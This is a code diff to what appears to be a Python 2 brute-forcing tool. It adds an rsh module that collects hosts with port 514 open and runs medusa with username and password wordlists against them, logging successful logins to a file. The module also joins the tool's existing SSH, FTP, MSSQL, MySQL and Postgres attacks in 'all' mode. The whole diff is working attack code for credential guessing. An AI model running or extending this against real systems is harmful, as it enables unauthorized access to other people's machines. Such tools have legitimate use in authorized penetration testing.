@@ -270,6 +270,35 @@ def brute_postgres():
     p.wait()
     os.remove(tmp)
 
+def brute_rsh():
+    name = 'rsh'
+    if not args.port:
+        port = "514"
+    else:
+        port = args.port
+
+    tmp = "tmp/tmprsh"
+    with open(tmp, 'w+') as f:
+        outputlist = ip_by_port(port)
+        f.write('\n'.join(outputlist))
+        f.write('\n')
+        
+    p = subprocess.Popen(['medusa', '-H', tmp, '-U', 'wordlist/rsh/user', '-P', 'wordlist/rsh/password', '-M', 'rsh', '-t', args.threads, '-n', port, '-T' , args.hosts], stdout=subprocess.PIPE, stderr=subprocess.PIPE, bufsize=1)
+
+    out = "[" + colors.green + "+" + colors.normal + "] "
+    output = outpath + name + '-success.txt'
+
+    for line in iter(p.stdout.readline, b''):
+        print line,        
+        if '[SUCCESS]' in line:
+            with open(output, 'a') as f:
+                f.write(out + line)
+                f.close()
+            
+    p.stdout.close()
+    p.wait()
+    os.remove(tmp)
+
 def parse_args():
     
     parser = argparse.ArgumentParser(formatter_class=RawTextHelpFormatter, description=\
@@ -322,6 +351,7 @@ if __name__ == "__main__":
     p_mssql = Process(target = brute_mssql)
     p_mysql = Process(target = brute_mysql)
     p_post = Process(target = brute_postgres)   
+    p_rsh = Process(target = brute_rsh)
  
     if args.service == 'ssh':
         brute_ssh()    
@@ -337,6 +367,8 @@ if __name__ == "__main__":
         brute_mysql()
     elif args.service == 'postgres':
         brute_postgres()
+    elif args.service == 'rsh':
+        brute_rsh()
     elif args.service == 'all':
         p_ssh.start()
         p_ftp.start()
@@ -345,5 +377,6 @@ if __name__ == "__main__":
         p_mssql.start()
         p_mysql.start()
         p_post.start()
+        p_rsh.start()
 
 
